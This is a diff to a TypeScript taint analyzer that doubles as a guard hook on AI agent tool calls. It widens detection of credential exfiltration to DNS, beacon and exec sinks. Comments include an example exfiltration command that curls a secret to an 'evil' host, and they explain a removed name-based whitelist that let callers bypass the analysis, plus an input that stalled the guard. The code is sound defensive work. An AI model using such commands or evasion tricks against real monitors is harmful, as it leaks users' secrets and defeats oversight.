@@ -1,5 +1,30 @@
-import * as ts from "typescript";
+import type * as TS from "typescript";
 import type { Severity, TaintFlow, TaintNode, TaintResult } from "../types.js";
+
+// ─── Lazy `typescript` load ───────────────────────────────────
+//
+// Requiring the TypeScript compiler costs ~145ms. `guard` runs as a PreToolUse
+// hook on EVERY tool call, and the overwhelming majority of those are Bash
+// commands that never need a JS/TS parse — yet a static import made every guarded
+// tool call pay the full 145ms of compiler startup. Measured end-to-end guard
+// latency before this change: ~350-400ms per invocation.
+//
+// The import above is type-only (erased at compile time); the runtime value is
+// bound on first use. `require` is available because this package is CJS (no
+// "type": "module"), which is also what tsup emits.
+declare const require: (id: string) => unknown;
+let ts!: typeof TS;
+
+// Type-position aliases. The `ts` binding above is a VALUE (assigned lazily), so
+// it cannot also serve as a type namespace; these keep annotations independent of
+// when the module is loaded.
+type TsNode = TS.Node;
+type TsCallExpression = TS.CallExpression;
+type TsNewExpression = TS.NewExpression;
+type TsExpression = TS.Expression;
+function ensureTs(): void {
+	if (!ts) ts = require("typescript") as typeof TS;
+}
 
 // Kept intentionally free of any tree-sitter import: this module is the JS/TS
 // analyzer (TypeScript compiler). Python/Bash/Rust dispatch lives in index.ts so
@@ -17,8 +42,16 @@ const FILE_READ_SOURCES = new Set([
 	"fs.readFileSync",
 	"fs.readFile",
 	"fs.promises.readFile",
-	"path.join", // Heuristic: path joining with tainted variables is often a source
+	"fs.readFileSync",
+	"fs.createReadStream",
+	"readFileSync",
+	"readFile",
 ]);
+// `path.join` was previously listed as a file-read SOURCE on the theory that
+// joining paths with tainted data is suspicious. In practice it made every
+// ordinary build script (`fs.writeFileSync(path.join(dir, name), data)`) a HIGH
+// data-flow finding, and `guard --profile strict` then BLOCKED benign tool calls.
+// Path construction is not a credential source; removed.
 
 const NETWORK_INPUT_SOURCES = new Set([
 	"fetch",
@@ -41,10 +74,31 @@ const NETWORK_OUTPUT_SINKS = new Set([
 	"fetch",
 	"http.request",
 	"https.request",
+	"http.get",
+	"https.get",
+	"axios",
 	"axios.post",
 	"axios.put",
 	"axios.patch",
+	"axios.request",
+	"got.post",
+	"got.put",
+	"navigator.sendBeacon",
+	"sendBeacon",
+	// DNS exfiltration: encoding a secret into a hostname is a standard covert
+	// channel that no HTTP-only sink table catches.
+	"dns.lookup",
+	"dns.resolve",
+	"dns.resolve4",
+	"dns.promises.lookup",
+	"dns.promises.resolve",
 ]);
+
+// Sink METHOD names matched on the FINAL property regardless of receiver, for
+// objects we cannot resolve statically (`ws.send`, `xhr.send`, `client.post`).
+// These are only ever consulted once an argument is already tainted, so the
+// false-positive surface is "tainted data passed to a method with this name".
+const NETWORK_SINK_METHODS = new Set(["send", "sendBeacon"]);
 
 const EXEC_SINKS = new Set([
 	"eval",
@@ -52,13 +106,36 @@ const EXEC_SINKS = new Set([
 	"execSync",
 	"spawn",
 	"spawnSync",
+	"execFile",
+	"execFileSync",
+	"fork",
+	// `new Function(src)` / `Function(src)` is eval by another name.
+	"Function",
 	"child_process.exec",
 	"child_process.execSync",
 	"child_process.spawn",
 	"child_process.spawnSync",
+	"child_process.execFile",
+	"child_process.execFileSync",
+	"child_process.fork",
 	"vm.runInContext",
 	"vm.runInNewContext",
 	"vm.runInThisContext",
+	"vm.compileFunction",
+]);
+
+// Exec sink method names matched on the final property regardless of receiver.
+// NOTE: bare `exec` is deliberately EXCLUDED — `/re/.exec(str)` is extremely
+// common and would generate constant false positives. `exec` is a sink only as a
+// bare call or through a receiver resolved to `child_process` (see resolveAlias).
+const EXEC_SINK_METHODS = new Set([
+	"execSync",
+	"execFile",
+	"execFileSync",
+	"spawnSync",
+	"runInNewContext",
+	"runInThisContext",
+	"compileFunction",
 ]);
 
 const FILE_WRITE_SINKS = new Set([
@@ -76,28 +153,64 @@ const ALL_SINKS = new Set([
 	...FILE_WRITE_SINKS,
 ]);
 
-const AI_AGENT_TOOL_WHITELIST = new Set([
-	"run_command",
-	"execute_command",
-	"execute_bash",
-	"python_run",
-]);
+// REMOVED: AI_AGENT_TOOL_WHITELIST.
+// A set of "known agent tool" function names (run_command, execute_command,
+// execute_bash, python_run) previously caused `visit()` to skip analysis of the
+// call entirely. That made it a one-line bypass: naming your exfiltration helper
+// `run_command` disabled all taint analysis of its arguments. Wrapper functions
+// are now analyzed like any other call — the interprocedural summary engine
+// already reasons about a wrapper whose parameter reaches an internal sink.
 
 // ─── Taint Rules ──────────────────────────────────────────────
+
+/** Final property of a dotted name ("cp.execSync" -> "execSync"). */
+function lastSegment(name: string): string {
+	const i = name.lastIndexOf(".");
+	return i === -1 ? name : name.slice(i + 1);
+}
+
+/**
+ * Sink predicates. A resolved callee counts as a sink either by exact qualified
+ * name or, for receivers we cannot resolve statically, by its method name. Used
+ * instead of raw `Set.has` so suffix-matched sinks are still classified (and
+ * therefore still severity-ranked) correctly.
+ */
+export function isNetworkSink(name: string): boolean {
+	if (NETWORK_OUTPUT_SINKS.has(name)) return true;
+	return name.includes(".") && NETWORK_SINK_METHODS.has(lastSegment(name));
+}
+
+export function isExecSink(name: string): boolean {
+	if (EXEC_SINKS.has(name)) return true;
+	return name.includes(".") && EXEC_SINK_METHODS.has(lastSegment(name));
+}
+
+function isFileWriteSink(name: string): boolean {
+	return FILE_WRITE_SINKS.has(name);
+}
+
+/** Any recognized sink. */
+export function isSink(name: string): boolean {
+	return isNetworkSink(name) || isExecSink(name) || isFileWriteSink(name);
+}
 
 function pickRule(
 	sourceName: string,
 	sinkName: string,
 	isDirect: boolean,
 ): string {
-	if (CREDENTIAL_SOURCES.has(sourceName) && NETWORK_OUTPUT_SINKS.has(sinkName))
+	if (CREDENTIAL_SOURCES.has(sourceName) && isNetworkSink(sinkName))
 		return "TT3";
-	if (FILE_READ_SOURCES.has(sourceName) && NETWORK_OUTPUT_SINKS.has(sinkName))
+	// Credentials into a shell/eval sink is exfiltration by another route:
+	// `cp.exec("curl https://evil/?d=" + secret)` leaks just as effectively as
+	// fetch() does, so it ranks with TT3 rather than as a generic direct flow.
+	if (CREDENTIAL_SOURCES.has(sourceName) && isExecSink(sinkName)) return "TT6";
+	if (FILE_READ_SOURCES.has(sourceName) && isNetworkSink(sinkName))
 		return "TT4";
 	if (
 		(NETWORK_INPUT_SOURCES.has(sourceName) ||
 			USER_INPUT_SOURCES.has(sourceName)) &&
-		EXEC_SINKS.has(sinkName)
+		isExecSink(sinkName)
 	)
 		return "TT5";
 	return isDirect ? "TT1" : "TT2";
@@ -114,6 +227,8 @@ function getRuleSeverity(ruleId: string): Severity {
 		case "TT4":
 			return "high";
 		case "TT5":
+			return "critical";
+		case "TT6":
 			return "critical";
 		default:
 			return "medium";
@@ -138,11 +253,12 @@ const SOURCE_CATEGORIES = [
 	{ names: USER_INPUT_SOURCES, label: "user input" },
 ];
 
-const SINK_CATEGORIES = [
-	{ names: NETWORK_OUTPUT_SINKS, label: "network output" },
-	{ names: EXEC_SINKS, label: "code execution" },
-	{ names: FILE_WRITE_SINKS, label: "file write" },
-];
+function sinkCategory(name: string): string {
+	if (isNetworkSink(name)) return "network output";
+	if (isExecSink(name)) return "code execution";
+	if (isFileWriteSink(name)) return "file write";
+	return "data sink";
+}
 
 interface TaintedVar {
 	name: string;
@@ -152,14 +268,38 @@ interface TaintedVar {
 
 // ─── AST Helpers ──────────────────────────────────────────────
 
-function getCallName(node: ts.Node): string | null {
-	if (ts.isCallExpression(node)) {
+/** A call or a `new` expression — both invoke code and both carry arguments. */
+function isCallLike(node: TsNode): node is TsCallExpression | TsNewExpression {
+	return ts.isCallExpression(node) || ts.isNewExpression(node);
+}
+
+function getCallName(node: TsNode): string | null {
+	if (isCallLike(node)) {
 		return getIdentifierName(node.expression);
 	}
 	return null;
 }
 
-function getIdentifierName(node: ts.Node): string | null {
+/** Arguments of a call-like node. `new X()` with no parens has none. */
+function argsOf(
+	node: TsCallExpression | TsNewExpression,
+): ReadonlyArray<TsExpression> {
+	return node.arguments ?? [];
+}
+
+/**
+ * `require("child_process")` appearing inline as a receiver, e.g.
+ * `require("child_process").execSync(cmd)`. Resolving this lets an inline require
+ * match the qualified sink table instead of yielding a null name.
+ */
+function inlineRequireModule(n: TsNode): string | null {
+	if (!ts.isCallExpression(n)) return null;
+	if (!ts.isIdentifier(n.expression) || n.expression.text !== "require") return null;
+	const arg = n.arguments[0];
+	return arg && ts.isStringLiteralLike(arg) ? arg.text : null;
+}
+
+function getIdentifierName(node: TsNode): string | null {
 	if (ts.isIdentifier(node)) {
 		return node.text;
 	}
@@ -169,11 +309,45 @@ function getIdentifierName(node: ts.Node): string | null {
 		return "this";
 	}
 	if (ts.isPropertyAccessExpression(node)) {
-		const obj = getIdentifierName(node.expression);
 		const prop = getIdentifierName(node.name);
+		const inlineModule = inlineRequireModule(node.expression);
+		if (inlineModule && prop) return `${inlineModule}.${prop}`;
+		const obj = getIdentifierName(node.expression);
 		if (obj && prop) return `${obj}.${prop}`;
 	}
 	return null;
+}
+
+// ─── Binding patterns (destructuring) ─────────────────────────
+//
+// `const { AWS_SECRET_ACCESS_KEY } = process.env` previously produced NO taint at
+// all: handleAssignment called getIdentifierName(target), which returns null for a
+// BindingPattern, and bailed. Destructuring is the idiomatic way to read env vars,
+// so the single most common real-world spelling of credential access was invisible
+// — and `guard`, which shares this analyzer, allowed it at runtime.
+//
+// Every name bound by the pattern inherits the taint of the initializer. This is a
+// deliberate over-approximation: we do not track WHICH property carried the taint,
+// because `process.env` and a parsed credentials file are tainted wholesale.
+
+/** All identifiers bound by a (possibly nested) destructuring pattern. */
+function collectBoundNames(target: TsNode): string[] {
+	const names: string[] = [];
+	function rec(n: TsNode): void {
+		if (ts.isIdentifier(n)) {
+			names.push(n.text);
+			return;
+		}
+		if (ts.isObjectBindingPattern(n) || ts.isArrayBindingPattern(n)) {
+			for (const el of n.elements) {
+				if (ts.isBindingElement(el)) rec(el.name);
+				// ArrayBindingPattern holes (OmittedExpression) bind nothing.
+			}
+			return;
+		}
+	}
+	rec(target);
+	return names;
 }
 
 // ─── Interprocedural summaries ────────────────────────────────
@@ -189,7 +363,7 @@ function getIdentifierName(node: ts.Node): string | null {
 
 interface FnDef {
 	readonly params: string[];
-	readonly body: ts.Node;
+	readonly body: TsNode;
 }
 interface FnSummary {
 	returnsSource: string | null;
@@ -211,7 +385,7 @@ function stronger(a: string | null, b: string | null): string | null {
 }
 // The source name a node directly denotes, if any (a source call or a
 // process.env-style attribute). Returns null for non-sources.
-function sourceNameOf(n: ts.Node): string | null {
+function sourceNameOf(n: TsNode): string | null {
 	const name =
 		getCallName(n) ||
 		(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
@@ -220,7 +394,7 @@ function sourceNameOf(n: ts.Node): string | null {
 	if (name.startsWith("process.env")) return "process.env";
 	return null;
 }
-function isFnLike(n: ts.Node): boolean {
+function isFnLike(n: TsNode): boolean {
 	return (
 		ts.isFunctionDeclaration(n) ||
 		ts.isFunctionExpression(n) ||
@@ -230,7 +404,7 @@ function isFnLike(n: ts.Node): boolean {
 }
 // Walk a subtree but do NOT descend into nested function bodies, so a summary
 // reflects only its own function.
-function walkOwn(node: ts.Node, fn: (n: ts.Node) => void): void {
+function walkOwn(node: TsNode, fn: (n: TsNode) => void): void {
 	fn(node);
 	node.forEachChild((c) => {
 		if (isFnLike(c)) return;
@@ -238,9 +412,9 @@ function walkOwn(node: ts.Node, fn: (n: ts.Node) => void): void {
 	});
 }
 
-function collectFunctions(root: ts.Node): Map<string, FnDef> {
+function collectFunctions(root: TsNode): Map<string, FnDef> {
 	const fns = new Map<string, FnDef>();
-	function rec(node: ts.Node) {
+	function rec(node: TsNode) {
 		if (ts.isFunctionDeclaration(node) && node.name && node.body) {
 			fns.set(node.name.text, {
 				params: node.parameters.map((p) => p.name.getText()),
@@ -287,7 +461,7 @@ function computeSummary(
 	const fromParams = new Map<string, Set<number>>();
 	const fromSource = new Map<string, string>();
 
-	const assigns: { target: string | null; value: ts.Node }[] = [];
+	const assigns: { target: string | null; value: TsNode }[] = [];
 	walkOwn(fn.body, (n) => {
 		if (ts.isVariableDeclaration(n) && n.initializer && ts.isIdentifier(n.name)) {
 			assigns.push({ target: n.name.text, value: n.initializer });
@@ -299,19 +473,33 @@ function computeSummary(
 		}
 	});
 
-	function exprTaint(node: ts.Node): { params: Set<number>; source: string | null } {
+	// exprTaint used to be EXPONENTIAL in call-nesting depth: on a call to a
+	// summarized pass-through function it called exprTaint(arg) — a full subtree
+	// traversal — and then forEachChild re-walked that same arg, doubling the work
+	// at every level. A 173-byte file (`id(id(id(...process.env.TOKEN...)))`) took
+	// 37 seconds, which stalls both `check` and the `guard` hot path on attacker-
+	// supplied input. Memoizing per node makes each pass linear. The cache is
+	// invalidated between fixpoint passes because fromParams/fromSource change.
+	let taintMemo = new Map<TsNode, { params: Set<number>; source: string | null }>();
+	function resetTaintMemo(): void {
+		taintMemo = new Map();
+	}
+
+	function exprTaint(node: TsNode): { params: Set<number>; source: string | null } {
+		const cached = taintMemo.get(node);
+		if (cached) return cached;
 		const params = new Set<number>();
 		let source: string | null = null;
-		function rec(n: ts.Node) {
+		function rec(n: TsNode) {
 			const s = sourceNameOf(n);
 			if (s) source = stronger(source, s);
-			if (ts.isCallExpression(n)) {
+			if (isCallLike(n)) {
 				const callee = getCallName(n);
 				const summ = callee ? summaries.get(callee) : undefined;
 				if (summ) {
 					if (summ.returnsSource) source = stronger(source, summ.returnsSource);
 					if (summ.paramReturns.size) {
-						n.arguments.forEach((a, i) => {
+						argsOf(n).forEach((a, i) => {
 							if (summ.paramReturns.has(i)) {
 								const t = exprTaint(a);
 								for (const p of t.params) params.add(p);
@@ -332,11 +520,14 @@ function computeSummary(
 			n.forEachChild(rec);
 		}
 		rec(node);
-		return { params, source };
+		const result = { params, source };
+		taintMemo.set(node, result);
+		return result;
 	}
 
 	for (let pass = 0; pass < 6; pass++) {
 		let changed = false;
+		resetTaintMemo();
 		for (const a of assigns) {
 			if (!a.target) continue;
 			const t = exprTaint(a.value);
@@ -362,13 +553,14 @@ function computeSummary(
 	}
 
 	const paramSinks = new Map<number, string>();
+	resetTaintMemo();
 	walkOwn(fn.body, (n) => {
-		if (!ts.isCallExpression(n)) return;
+		if (!isCallLike(n)) return;
 		const callName = getCallName(n);
 		if (!callName) return;
 		// A param reaching a DIRECT known sink's arguments.
-		if (ALL_SINKS.has(callName)) {
-			n.arguments.forEach((arg) => {
+		if (isSink(callName)) {
+			argsOf(n).forEach((arg) => {
 				for (const p of exprTaint(arg).params) {
 					if (!paramSinks.has(p)) paramSinks.set(p, callName);
 				}
@@ -379,7 +571,7 @@ function computeSummary(
 		const summ = summaries.get(callName);
 		if (summ && summ.paramSinks.size) {
 			summ.paramSinks.forEach((internalSink, j) => {
-				const arg = n.arguments[j];
+				const arg = argsOf(n)[j];
 				if (!arg) return;
 				for (const p of exprTaint(arg).params) {
 					if (!paramSinks.has(p)) paramSinks.set(p, internalSink);
@@ -390,6 +582,7 @@ function computeSummary(
 
 	const paramReturns = new Set<number>();
 	let returnsSource: string | null = null;
+	resetTaintMemo();
 	walkOwn(fn.body, (n) => {
 		if (ts.isReturnStatement(n) && n.expression) {
 			const t = exprTaint(n.expression);
@@ -416,7 +609,7 @@ function sameSummary(a: FnSummary, b: FnSummary): boolean {
 	return true;
 }
 
-function buildSummaries(root: ts.Node): Map<string, FnSummary> {
+function buildSummaries(root: TsNode): Map<string, FnSummary> {
 	const fns = collectFunctions(root);
 	const summaries = new Map<string, FnSummary>();
 	for (const name of fns.keys()) {
@@ -446,6 +639,7 @@ function buildSummaries(root: ts.Node): Map<string, FnSummary> {
 export function analyzeTaint(
 	files: ReadonlyArray<{ readonly path: string; readonly content: string }>,
 ): TaintResult {
+	ensureTs();
 	const allSources: TaintNode[] = [];
 	const allSinks: TaintNode[] = [];
 	const allFlows: TaintFlow[] = [];
@@ -471,9 +665,74 @@ export function analyzeTaint(
 		// `const e = process.env`) is still recognized. Only plain identifier =
 		// identifier assignments are recorded.
 		const aliases = new Map<string, string>();
+
+		// Module bindings, so a namespaced sink resolves to its qualified name:
+		//   const cp = require("child_process")        -> cp        => child_process
+		//   import * as cp from "child_process"        -> cp        => child_process
+		// and direct function bindings:
+		//   const { execFile } = require("child_process") -> execFile => child_process.execFile
+		//   import { execFile } from "child_process"      -> execFile => child_process.execFile
+		//
+		// Without this, `cp.exec(secret)` resolved to the literal name "cp.exec",
+		// matched nothing in the sink table, and a plain credential-exfil script
+		// reported CLEAN. Only bare `exec()` was ever detected.
+		const moduleAliases = new Map<string, string>();
+		const functionAliases = new Map<string, string>();
+
+		function recordRequire(nameNode: TsNode, moduleName: string): void {
+			if (ts.isIdentifier(nameNode)) {
+				moduleAliases.set(nameNode.text, moduleName);
+				return;
+			}
+			if (ts.isObjectBindingPattern(nameNode)) {
+				for (const el of nameNode.elements) {
+					if (!ts.isBindingElement(el) || !ts.isIdentifier(el.name)) continue;
+					const exported =
+						el.propertyName && ts.isIdentifier(el.propertyName)
+							? el.propertyName.text
+							: el.name.text;
+					functionAliases.set(el.name.text, `${moduleName}.${exported}`);
+				}
+			}
+		}
+
+		function collectImportAliases(root: TsNode): void {
+			function rec(n: TsNode): void {
+				// const X = require("m") / const { a } = require("m")
+				if (ts.isVariableDeclaration(n) && n.initializer) {
+					const mod = inlineRequireModule(n.initializer);
+					if (mod) recordRequire(n.name, mod);
+				}
+				// import ... from "m"
+				if (ts.isImportDeclaration(n) && ts.isStringLiteralLike(n.moduleSpecifier)) {
+					const mod = n.moduleSpecifier.text;
+					const clause = n.importClause;
+					if (clause) {
+						if (clause.name) moduleAliases.set(clause.name.text, mod);
+						const b = clause.namedBindings;
+						if (b && ts.isNamespaceImport(b)) moduleAliases.set(b.name.text, mod);
+						if (b && ts.isNamedImports(b)) {
+							for (const el of b.elements) {
+								const exported = el.propertyName?.text ?? el.name.text;
+								functionAliases.set(el.name.text, `${mod}.${exported}`);
+							}
+						}
+					}
+				}
+				n.forEachChild(rec);
+			}
+			rec(root);
+		}
+		collectImportAliases(sourceFile);
+
 		function resolveAlias(name: string): string {
+			// A bare name bound directly to a module export wins outright.
+			const fn = functionAliases.get(name);
+			if (fn) return fn;
 			const dot = name.indexOf(".");
 			const head = dot === -1 ? name : name.slice(0, dot);
+			const mod = moduleAliases.get(head);
+			if (mod) return mod + (dot === -1 ? "" : name.slice(dot));
 			const target = aliases.get(head);
 			return target ? target + (dot === -1 ? "" : name.slice(dot)) : name;
 		}
@@ -484,9 +743,9 @@ export function analyzeTaint(
 
 		// The tainted origin (source-call name) an argument expression carries, if
 		// any — a direct source or a reference to an already-tainted variable/member.
-		function argOrigin(argNode: ts.Node): string | null {
+		function argOrigin(argNode: TsNode): string | null {
 			let origin: string | null = null;
-			function rec(n: ts.Node) {
+			function rec(n: TsNode) {
 				if (!origin) {
 					const rawName =
 						getCallName(n) ||
@@ -543,7 +802,7 @@ export function analyzeTaint(
 			});
 		}
 
-		function visit(node: ts.Node) {
+		function visit(node: TsNode) {
 			// 1. Check for assignments to track tainted variables
 			if (ts.isVariableDeclaration(node) && node.initializer) {
 				handleAssignment(node.name, node.initializer);
@@ -555,22 +814,16 @@ export function analyzeTaint(
 			}
 
 			// 2. Check for sink calls
-			if (ts.isCallExpression(node)) {
+			if (isCallLike(node)) {
 				const rawSink = getCallName(node);
 				const sinkName = rawSink ? resolveAlias(rawSink) : null;
 
-				// Skip if the function called is a known AI agent tool
-				if (sinkName && AI_AGENT_TOOL_WHITELIST.has(sinkName)) {
-					ts.forEachChild(node, visit);
-					return;
-				}
-
-				if (sinkName && ALL_SINKS.has(sinkName)) {
+				if (sinkName && isSink(sinkName)) {
 					const lineno =
 						sourceFile.getLineAndCharacterOfPosition(node.getStart()).line + 1;
 
 					// Check flows inside the sink's arguments
-					node.arguments.forEach((arg) => {
+					argsOf(node).forEach((arg) => {
 						checkDirectSources(arg, sinkName, lineno);
 						checkTaintedVars(arg, sinkName, lineno);
 					});
@@ -583,7 +836,7 @@ export function analyzeTaint(
 					const lineno =
 						sourceFile.getLineAndCharacterOfPosition(node.getStart()).line + 1;
 					summ.paramSinks.forEach((internalSink, i) => {
-						const arg = node.arguments[i];
+						const arg = argsOf(node)[i];
 						if (!arg) return;
 						const o = argOrigin(arg);
 						if (o) {
@@ -602,9 +855,19 @@ export function analyzeTaint(
 			ts.forEachChild(node, visit);
 		}
 
-		function handleAssignment(target: ts.Node, value: ts.Node) {
-			const targetName = getIdentifierName(target);
-			if (!targetName) return;
+		function handleAssignment(target: TsNode, value: TsNode) {
+			// Destructuring binds many names at once; a single identifier binds one.
+			// Both are handled by resolving the initializer's taint ONCE and applying
+			// it to every bound name.
+			const isPattern =
+				ts.isObjectBindingPattern(target) || ts.isArrayBindingPattern(target);
+			const targetNames = isPattern
+				? collectBoundNames(target)
+				: (() => {
+						const n = getIdentifierName(target);
+						return n ? [n] : [];
+					})();
+			if (targetNames.length === 0) return;
 
 			// Record a plain `x = y` identifier alias (y a bare identifier) so a sink
 			// reached via x is resolved back to y.
@@ -616,47 +879,35 @@ export function analyzeTaint(
 				sourceFile.getLineAndCharacterOfPosition(target.getStart()).line + 1;
 			let sourceFound = false;
 
-			function findSource(n: ts.Node) {
+			// Mark every name bound by this assignment as tainted by `sourceCall`.
+			function taintTargets(sourceCall: string, at: number): void {
+				for (const name of targetNames) {
+					tainted.set(name, { name, sourceCall, lineno: at });
+				}
+				sourceFound = true;
+			}
+
+			function findSource(n: TsNode) {
 				const rawName =
 					getCallName(n) ||
 					(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
 				const name = rawName ? resolveAlias(rawName) : null;
 				if (name && ALL_SOURCES.has(name as string)) {
-					tainted.set(targetName as string, {
-						name: targetName as string,
-						sourceCall: name as string,
-						lineno,
-					});
-					sourceFound = true;
+					taintTargets(name as string, lineno);
 				} else if (name?.startsWith("process.env")) {
-					tainted.set(targetName as string, {
-						name: targetName as string,
-						sourceCall: "process.env",
-						lineno,
-					});
-					sourceFound = true;
-				} else if (ts.isCallExpression(n) && name && summaries.has(name)) {
+					taintTargets("process.env", lineno);
+				} else if (isCallLike(n) && name && summaries.has(name)) {
 					// Interprocedural: `x = F(...)` where F returns tainted data (from an
 					// in-body source, or by passing an argument through to its return).
 					const summ = summaries.get(name) as FnSummary;
 					if (summ.returnsSource) {
-						tainted.set(targetName as string, {
-							name: targetName as string,
-							sourceCall: summ.returnsSource,
-							lineno,
-						});
-						sourceFound = true;
+						taintTargets(summ.returnsSource, lineno);
 					} else if (summ.paramReturns.size) {
 						for (const i of summ.paramReturns) {
-							const arg = n.arguments[i];
+							const arg = argsOf(n)[i];
 							const o = arg ? argOrigin(arg) : null;
 							if (o) {
-								tainted.set(targetName as string, {
-									name: targetName as string,
-									sourceCall: o,
-									lineno,
-								});
-								sourceFound = true;
+								taintTargets(o, lineno);
 								break;
 							}
 						}
@@ -665,12 +916,7 @@ export function analyzeTaint(
 					// Taint propagation: target = taintedVar
 					const t = tainted.get(n.text);
 					if (t) {
-						tainted.set(targetName as string, {
-							name: targetName as string,
-							sourceCall: t.sourceCall,
-							lineno: t.lineno,
-						});
-						sourceFound = true;
+						taintTargets(t.sourceCall, t.lineno);
 					}
 				}
 				if (!sourceFound) ts.forEachChild(n, findSource);
@@ -679,11 +925,11 @@ export function analyzeTaint(
 		}
 
 		function checkDirectSources(
-			argNode: ts.Node,
+			argNode: TsNode,
 			sinkName: string,
 			lineno: number,
 		) {
-			function find(n: ts.Node) {
+			function find(n: TsNode) {
 				const rawName =
 					getCallName(n) ||
 					(ts.isPropertyAccessExpression(n) ? getIdentifierName(n) : null);
@@ -692,7 +938,7 @@ export function analyzeTaint(
 					const srcName = name.startsWith("process.env") ? "process.env" : name;
 					const rule = pickRule(srcName, sinkName, true);
 					const srcCat = classify(srcName, SOURCE_CATEGORIES, "data source");
-					const sinkCat = classify(sinkName, SINK_CATEGORIES, "data sink");
+					const sinkCat = sinkCategory(sinkName);
 					emit(
 						rule,
 						lineno,
@@ -727,14 +973,14 @@ export function analyzeTaint(
 		}
 
 		function checkTaintedVars(
-			argNode: ts.Node,
+			argNode: TsNode,
 			sinkName: string,
 			lineno: number,
 		) {
 			function emitTainted(t: TaintedVar) {
 				const rule = pickRule(t.sourceCall, sinkName, false);
 				const srcCat = classify(t.sourceCall, SOURCE_CATEGORIES, "data source");
-				const sinkCat = classify(sinkName, SINK_CATEGORIES, "data sink");
+				const sinkCat = sinkCategory(sinkName);
 				emit(
 					rule,
 					lineno,
@@ -744,7 +990,7 @@ export function analyzeTaint(
 				);
 			}
 
-			function find(n: ts.Node) {
+			function find(n: TsNode) {
 				// Member access (o.x, this.x): look the WHOLE access path up in the
 				// tainted map. Previously only bare identifiers were checked, so a
 				// tainted object field written as `o.x = secret` was a dead store —
